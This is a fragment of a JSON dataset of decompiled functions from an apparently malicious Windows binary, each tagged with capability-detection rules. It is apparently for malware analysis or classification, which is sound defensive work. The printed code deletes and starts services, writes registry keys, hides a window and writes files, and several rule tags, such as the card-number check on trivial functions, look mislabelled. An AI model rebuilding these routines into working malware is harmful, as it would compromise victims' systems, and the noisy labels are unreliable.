param_1;\n    if (!in_OF) goto code_r0x004031ce;\n    LOCK();\n    puVar16 = 0x138b2633;\n    in_EAX = in_EAX + 0x658f517f;\n    do {\n        param_1 = uVar10;\n        puVar17 = puVar16;\ncode_r0x004031ce:\n        puVar17[1] = 0xfb;\n        bVar18 = (POPCOUNT(param_2 - 1U & param_1 & 0xff) & 1U) == 0;\n        puVar17[2] = 0xaf;\n        if ((bVar18) || (!bVar18)) {\n            puVar17[3] = 0x8d;\n            uVar5 = in_EAX;\ncode_r0x00403208:\n            in_EAX = param_2;\n            uStack18 = uVar12 >> 0x10;\n            uStack20 = in_EAX;\n        }\n        else {\n            uVar5 = param_2 + 1;\n            puVar14 = *0xc617b43a;\n            puVar17 = 0x34a96cf5;\n            uStack20 = in_EAX;\n            uStack18 = in_EAX >> 0x10;\n        }\n        uVar3 = in_EAX & 0xffff0000;\n        uVar10 = uStack18;\n        uVar12 = uStack16._2_2_ << 0x10;\n        puVar17[4] = 0x74;\n        uStack16._2_2_ = uStack20;\n        bVar18 = (POPCOUNT(uStack20 + -0x51) & 1U) == 0;\n        param_2 = uVar3 | uStack20;\n        in_EAX = CONCAT31(uVar5 >> 8, 0xec);\n        puVar17[5] = 0xec;\n        puVar16 = puVar17;\n        if ((bVar18) || (!bVar18)) goto code_r0x00403251;\n        puVar16 = *unaff_EDI;\n        *unaff_EDI = puVar17;\n        puVar14 = puVar14 - *(puVar14 + 0x5f9dff63);\n    } while (puVar14 < 0);\n    bVar18 = (POPCOUNT(puVar16 & 0xff) & 1U) == 0;\n    if (puVar16 < 0) {\ncode_r0x00403251:\n        puVar16[6] = 0xec;\n        if ((!bVar18) && (bVar18)) {\n            puVar15 = &stack0xfffffff4;\n            cVar2 = '\\x1e';\n            do {\n                puVar14 = puVar14 + -1;\n                puVar15 = puVar15 + -1;\n                *puVar15 = *puVar14;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            uVar6 = in(0x78);\n            return CONCAT44(param_2, uVar6);\n        }\n        puVar16[7] = 0xe3;\n        puVar16[8] = 0x8a;\n        unaff_EBX = unaff_EBX & 0xffff0000 | uStack20;\n        in_EAX = in_EAX & 0xffff0000;\n        param_2 = uVar3 | uStack20 - 1;\n    }\n    bVar18 = (param_2 & uStack18) < 0;\n    piVar11 = param_2 & 0xffff0000 | unaff_EBX & 0xffff;\n    piVar7 = in_EAX & 0xffff0000 | unaff_EBX >> 0x10;\n    puVar16[9] = 0xa4;\n    if ((bVar18) || (uStack18 = uStack18 & 0xff | (uVar10 >> 8) << 8,  !bVar18)) {\n        puVar16[10] = 0x17;\n    }\n    else {\n        *(piVar7 + -0x1f3a4905) = in_ST0;\n        uVar4 = piVar7 + -1;\n        uVar1 = 9 < (uVar4 & 0xf) | in_AF;\n        uVar4 = uVar4 + uVar1 * '\\x06';\n        piVar7 = piVar7 + -1 & 0xffffff00 | uVar4 + (0x90 < (uVar4 & 0xf0) | uVar1 * (0xf9 < uVar4)) * '`';\n        *piVar11 = *piVar11 + 0x46c6df84;\n        piVar11 = param_2 & 0xffff0000 | unaff_EBX & 0xff00 | unaff_EBX | *unaff_EBP;\n    }\n    puVar16[0xb] = 0xae;\n    puVar16[0xc] = 0x89;\n    uVar9 = uStack18 + 1;\n    bVar19 = ((uVar9 & 0xff | (uVar9 >> 8 & piVar7 + 2U) << 8) & 0x7bc9) == 0;\n    puVar16[0xd] = 199;\n    puVar16[0xe] = 0x90;\n    bVar18 = (POPCOUNT(uVar9 & 0xc9) & 1U) == 0;\n    if ((bVar18) || (!bVar18)) {\n        puVar16[0xf] = 0xda;\n        piVar8 = piVar7;\n        puVar15 = puVar14;\n        if (bVar19) goto code_r0x0040335e;\n    }\n    else {\n        puVar16 = 0x34a96cf5;\n        bVar19 = false;\n        piVar8 = piVar11 + 1;\n        piVar11 = piVar7;\n        puVar15 = *0xc617b43a;\n    }\n    puVar14 = puVar15;\n    if (bVar19) {\n        puVar13 = &stack0xfffffff8;\n        puVar14 = &stack0xfffffff8;\n        cVar2 = '\\x10';\n        do {\n            puVar15 = puVar15 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar15;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\ncode_r0x0040335e:\n    bVar20 = false;\n    bVar18 = false;\n    puVar16[0x10] = 0x7d;\n    if ((bVar19) || (!bVar19)) {\n        puVar16[0x11] = 0xbd;\n    }\n    else {\n        *(puVar14 + 0x1b8c0f) = *(puVar14 + 0x1b8c0f) + unaff_EBP;\n        bVar20 = SCARRY1(*piVar8, piVar8);\n        *piVar8 = *piVar8 + piVar8;\n        bVar18 = *piVar8 < '\\0';\n    }\n    if (bVar20 != bVar18) {\n        out(0xc4, piVar8);\n        piVar11 = piVar11 & 0xffffff00 | piVar11 ^ uStack18;\n        *unaff_EBP = piVar8;\n    }\n    puVar16[0x12] = 0x72;\n    puVar14 = puVar14[3];\n    *puVar14 = 0x13;\n    return CONCAT44(piVar11, puVar14);\n}\n",
        "token_count": 2306
    },
    "004033c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004033c0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403180(&var_68h, &var_4h);\n    fcn.00402a00(&var_68h, var_4h, 0x406014, 0xa420);\n    *arg_8h = 0x406014;\n    *arg_ch = 0xa420;\n    return;\n}\n",
        "token_count": 237
    },
    "004036a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403735)\n// WARNING: Removing unreachable block (ram,0x00403739)\n// WARNING: Removing unreachable block (ram,0x0040373a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.004036a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 254
    },
    "00403750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.00403750(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00403790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004037c3) overlaps instruction at (ram,0x004037c2)\n// \n// WARNING: Removing unreachable block (ram,0x004037c0)\n\nuint __cdecl fcn.00403790(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00404290(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00404290(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 207
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00402b80(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00403be0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00403ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ba0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00403ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403ca9) overlaps instruction at (ram,0x00403ca8)\n// \n// WARNING: Removing unreachable block (ram,0x00403ceb)\n// WARNING: Removing unreachable block (ram,0x00403cf8)\n// WARNING: Removing unreachable block (ram,0x00403ca9)\n\nuint __cdecl fcn.00403ca0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 215
    },
    "00403d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain pusha popa sequence",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d80) overlaps instruction at (ram,0x00403d7c)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403d20(uint filename, uint stream, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    uint16_t extraout_CX;\n    int32_t extraout_ECX;\n    int32_t *unaff_EDI;\n    uchar uVar2;\n    char cVar3;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, stream);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = 0;\n    cVar3 = (extraout_CX | 0x31fd) == 0;\n    do {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        if ((uVar2) || (!uVar2)) break;\n    } while (extraout_ECX != 1 && cVar3 != '\\0');\n    *unaff_EDI = iVar1 + 4;\n    (*_sym.imp.MSVCRT.dll_fflush)();\n    (*_sym.imp.MSVCRT.dll_fclose)();\n    return 1;\n}\n",
        "token_count": 291
    },
    "004041a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.004041a0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00402720();\n    puStack296 = 0x4041ea;\n    fcn.00402d90(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x404204;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x404217;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41f990;\n    uStack312 = 0x41f79c;\n    uStack316 = 0x80000000;\n    uStack320 = 0x404237;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x41f7d0;\n    uStack328 = 1;\n    uStack332 = 0x41f990;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x41f81c, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x41f858, 1, 0x41f860, 0x14);\n    return;\n}\n",
        "token_count": 653
    },
    "004045a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004045a0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004043c0(&var_68h, &var_4h);\n    fcn.00402a00(&var_68h, var_4h, 0x410444, 0xf000);\n    *arg_8h = 0x410444;\n    *arg_ch = 0xf000;\n    return;\n}\n",
        "token_count": 238
    },
    "00401580": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401580(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00403be0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403c30) overlaps instruction at (ram,0x00403c2f)\n// \n\nuint fcn.00403be0(uint param_1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t *unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    iVar3 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x406010, 0x41f990, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, param_1, 0);\n    if (iVar3 != 0) {\n        uVar2 = iVar3;\n        cVar1 = uVar2 - *unaff_EDI;\n        uVar4 = func_0x10189ba2((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                                (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI |\n                                (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                (in_AC & 1) * 0x40000);\n        (*_sym.imp.USER32.dll_ShowWindow)(uVar4);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 484
    },
    "00403dc0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403dc0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41f638, 0x41f67c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    }
}